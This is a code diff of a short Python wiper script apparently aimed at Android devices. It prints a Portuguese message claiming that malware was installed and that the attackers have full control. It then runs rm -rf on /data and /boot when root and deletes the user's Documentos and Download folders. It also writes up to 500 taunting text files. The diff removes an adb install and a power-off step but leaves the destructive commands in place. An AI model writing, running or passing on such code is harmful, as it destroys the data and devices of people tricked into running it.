@@ -13,8 +13,6 @@ class malwaRe:
     	print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL\n")
     	sleep(1)
     	
-    	run("pkg install adb", shell=True)
-    	
     	if os.geteuid() == 0:
     	    run("rm -rf /data",shell=True)
     	    run("rm -rf /boot",shell=True)
@@ -26,13 +24,10 @@ class malwaRe:
     		run("rm -rf /sdcard/Documentos", shell=True)
     	run("rm -rf /sdcard/Download", shell=True)
     	
-    	for i in range(1, 101):
+    	for i in range(1, 501):
     	       with open(f"BY_WpsDroid{i}.txt", 'w') as f:
     	           f.write("kkk script kiddie otario")
     	           open(f"BY_WpsDroid{i}.txt")
-    	           
-    	run("adb shell reboot -p", shell=True)
                 
 wiper = malwaRe()
 wiper.start()
-  
